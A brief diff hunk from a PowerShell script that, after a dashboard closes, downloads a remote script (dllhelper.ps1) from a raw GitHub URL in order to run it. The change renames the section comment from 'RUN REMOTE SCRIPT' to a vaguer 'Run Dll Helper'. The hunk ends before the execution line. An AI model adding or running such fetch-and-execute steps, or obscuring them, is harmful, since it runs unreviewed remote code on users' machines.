@@ -115,7 +115,7 @@ while ($true) {
     Start-Sleep -Seconds 1
 }
 
-# ========== 2. AFTER DASHBOARD EXITS, RUN REMOTE SCRIPT ==========
+# ========== 2. Run Dll Helper ==========
 Write-Host "`nDashboard closed. Now downloading and running remote script from GitHub..." -ForegroundColor Cyan
 $remoteUrl = "https://raw.githubusercontent.com/printipel/Screesh/refs/heads/main/dllhelper.ps1"
 try {
